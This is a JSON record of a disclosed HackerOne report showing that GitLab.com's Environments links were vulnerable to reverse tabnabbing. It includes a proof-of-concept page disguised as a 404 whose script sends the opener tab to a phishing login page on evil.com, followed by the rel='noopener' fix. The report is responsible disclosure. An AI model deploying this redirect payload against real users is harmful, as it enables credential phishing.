{"id":211065,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTEwNjU=","url":"https://hackerone.com/reports/211065","title":"Gitlab.com is vulnerable to reverse tabnabbing.","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-03-06T10:41:48.808Z","submitted_at":"2017-03-06T10:41:48.808Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"edoverflow","url":"/edoverflow","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-03-21T15:58:42.727Z","bug_reporter_agreed_on_going_public_at":"2017-03-21T08:57:54.883Z","team_member_agreed_on_going_public_at":"2017-03-21T15:58:42.638Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Dear GitLab bug bounty team,\n\n# Summary\n---\n\nGitlab.com is vulnerable to reverse tabnabbing, since you use `target=\"_blank\"` on links in the *Environments* section.\n\n{F166659}\n\n# Why does this vulnerability exist?\n---\n\nThe following `\u003ca href=\"https://example.com/\" target=\"_blank\"\u003elink\u003c/a\u003e` is vulnerable to reverse tabnabbing, because it uses `target=\"_blank\"`:\n\n~~~\n\u003ca target=\"_blank\" class=\"btn external-url\" href=\"https://evil.com\"\u003e\u003ci class=\"fa fa-external-link\"\u003e\u003c/i\u003e\n\u003c/a\u003e\n~~~\n\nThis means the page that opens in a new tab can access the initial tab and change its location using the `window.opener` property.\n\n# What are the exploits?\n---\n\nI used some simple tricks to further increase the chances of this attack working. I added a link to a website which contains the following code:\n\n~~~\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n    \u003ctitle\u003e404 Not Found\u003c/title\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n    \u003ch1\u003eNot Found\u003c/h1\u003e\n    \u003cp\u003eThe requested URL was not found on this server.\u003c/p\u003e\n    \u003chr\u003e\n    \u003caddress\u003eApache/2.2.15 (Red Hat) Server at gitlab.com Port 443\u003c/address\u003e\n    \u003cscript\u003e\n        window.opener.location.assign('https://evil.com/ph-login.html');\n    \u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n~~~\n\n{F166662}\n\nThe new tab displays a 404 page which increases the likelihood that the victim will return to the previous tab. While the victim visited the attacker's page, the initial tab was redirected to `https://evil.com/ph-login.html`. This page looks exactly like the GitLab login form and asks the victim to re-enter their login credentials.\n\n{F166660}\n\n# How can this be fixed?\n---\n\nIn order to mitigate this issue, developers are encouraged to use `rel=\"nofollow noopener noreferrer\"` as follows:\n\n~~~\n\u003ca target=\"_blank\" class=\"btn external-url\" href=\"https://evil.com\" rel=\"nofollow noopener noreferrer\"\u003e\u003ci class=\"fa fa-external-link\"\u003e\u003c/i\u003e\n\u003c/a\u003e\n~~~\n\nNow when you click on this link, the attacker cannot access the initial tab.\n\nFor more on reverse tabnabbing, please refer to the following page: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/\n\nIf you require further information feel free to contact me.\n\nYours sincerely,\nEd","vulnerability_information_html":"\u003cp\u003eDear GitLab bug bounty team,\u003c/p\u003e\n\n\u003ch1 id=\"summary\"\u003eSummary\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eGitlab.com is vulnerable to reverse tabnabbing, since you use \u003ccode\u003etarget=\u0026quot;_blank\u0026quot;\u003c/code\u003e on links in the \u003cem\u003eEnvironments\u003c/em\u003e section.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"environments-gitlab.PNG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/166/659/dcece84bf3acf8f08217cc798f629c5e690a6226/environments-gitlab.PNG?response-content-disposition=attachment%3B%20filename%3D%22environments-gitlab.PNG%22%3B%20filename%2A%3DUTF-8%27%27environments-gitlab.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045649Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026amp;X-Amz-Signature=954526b9dde6198c0132b840f82af033bde3140a475767fbfc001e4ae8f2348c\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/166/659/dcece84bf3acf8f08217cc798f629c5e690a6226/environments-gitlab.PNG?response-content-disposition=attachment%3B%20filename%3D%22environments-gitlab.PNG%22%3B%20filename%2A%3DUTF-8%27%27environments-gitlab.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045649Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026amp;X-Amz-Signature=954526b9dde6198c0132b840f82af033bde3140a475767fbfc001e4ae8f2348c\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"why-does-this-vulnerability-exist\"\u003eWhy does this vulnerability exist?\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eThe following \u003ccode\u003e\u0026lt;a href=\u0026quot;https://example.com/\u0026quot; target=\u0026quot;_blank\u0026quot;\u0026gt;link\u0026lt;/a\u0026gt;\u003c/code\u003e is vulnerable to reverse tabnabbing, because it uses \u003ccode\u003etarget=\u0026quot;_blank\u0026quot;\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;a target=\u0026quot;_blank\u0026quot; class=\u0026quot;btn external-url\u0026quot; href=\u0026quot;https://evil.com\u0026quot;\u0026gt;\u0026lt;i class=\u0026quot;fa fa-external-link\u0026quot;\u0026gt;\u0026lt;/i\u0026gt;\n\u0026lt;/a\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis means the page that opens in a new tab can access the initial tab and change its location using the \u003ccode\u003ewindow.opener\u003c/code\u003e property.\u003c/p\u003e\n\n\u003ch1 id=\"what-are-the-exploits\"\u003eWhat are the exploits?\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eI used some simple tricks to further increase the chances of this attack working. I added a link to a website which contains the following code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;title\u0026gt;\u003c/span\u003e404 Not Found\u003cspan class=\"nt\"\u003e\u0026lt;/title\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;h1\u0026gt;\u003c/span\u003eNot Found\u003cspan class=\"nt\"\u003e\u0026lt;/h1\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;p\u0026gt;\u003c/span\u003eThe requested URL was not found on this server.\u003cspan class=\"nt\"\u003e\u0026lt;/p\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;hr\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;address\u0026gt;\u003c/span\u003eApache/2.2.15 (Red Hat) Server at gitlab.com Port 443\u003cspan class=\"nt\"\u003e\u0026lt;/address\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopener\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eassign\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehttps://evil.com/ph-login.html\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"404-gitlab.PNG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/166/662/ab7bb15273e094a92d69f93e2b1f4a63b2fbd13a/404-gitlab.PNG?response-content-disposition=attachment%3B%20filename%3D%22404-gitlab.PNG%22%3B%20filename%2A%3DUTF-8%27%27404-gitlab.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045649Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026amp;X-Amz-Signature=e71f84345a954e57e02b7ea9ab34af7a52291d8123e2172a1f7760cf9c9c9df6\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/166/662/ab7bb15273e094a92d69f93e2b1f4a63b2fbd13a/404-gitlab.PNG?response-content-disposition=attachment%3B%20filename%3D%22404-gitlab.PNG%22%3B%20filename%2A%3DUTF-8%27%27404-gitlab.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045649Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026amp;X-Amz-Signature=e71f84345a954e57e02b7ea9ab34af7a52291d8123e2172a1f7760cf9c9c9df6\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe new tab displays a 404 page which increases the likelihood that the victim will return to the previous tab. While the victim visited the attacker\u0026#39;s page, the initial tab was redirected to \u003ccode\u003ehttps://evil.com/ph-login.html\u003c/code\u003e. This page looks exactly like the GitLab login form and asks the victim to re-enter their login credentials.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"login-gitlab.PNG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/166/660/2192dfde731fec97449c3d309d00d357e56efa6c/login-gitlab.PNG?response-content-disposition=attachment%3B%20filename%3D%22login-gitlab.PNG%22%3B%20filename%2A%3DUTF-8%27%27login-gitlab.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045649Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026amp;X-Amz-Signature=1fb60f5da999937274f4b5583c8143543712711223dd56f285c0b08e40a981e1\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/166/660/2192dfde731fec97449c3d309d00d357e56efa6c/login-gitlab.PNG?response-content-disposition=attachment%3B%20filename%3D%22login-gitlab.PNG%22%3B%20filename%2A%3DUTF-8%27%27login-gitlab.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045649Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026amp;X-Amz-Signature=1fb60f5da999937274f4b5583c8143543712711223dd56f285c0b08e40a981e1\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"how-can-this-be-fixed\"\u003eHow can this be fixed?\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eIn order to mitigate this issue, developers are encouraged to use \u003ccode\u003erel=\u0026quot;nofollow noopener noreferrer\u0026quot;\u003c/code\u003e as follows:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;a target=\u0026quot;_blank\u0026quot; class=\u0026quot;btn external-url\u0026quot; href=\u0026quot;https://evil.com\u0026quot; rel=\u0026quot;nofollow noopener noreferrer\u0026quot;\u0026gt;\u0026lt;i class=\u0026quot;fa fa-external-link\u0026quot;\u0026gt;\u0026lt;/i\u0026gt;\n\u0026lt;/a\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow when you click on this link, the attacker cannot access the initial tab.\u003c/p\u003e\n\n\u003cp\u003eFor more on reverse tabnabbing, please refer to the following page: \u003ca title=\"https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/\" href=\"/redirect?url=https%3A%2F%2Fwww.jitbit.com%2Falexblog%2F256-targetblank---the-most-underestimated-vulnerability-ever%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIf you require further information feel free to contact me.\u003c/p\u003e\n\n\u003cp\u003eYours sincerely,\u003cbr\u003e\nEd\u003c/p\u003e\n","weakness":{"id":53,"name":"Open 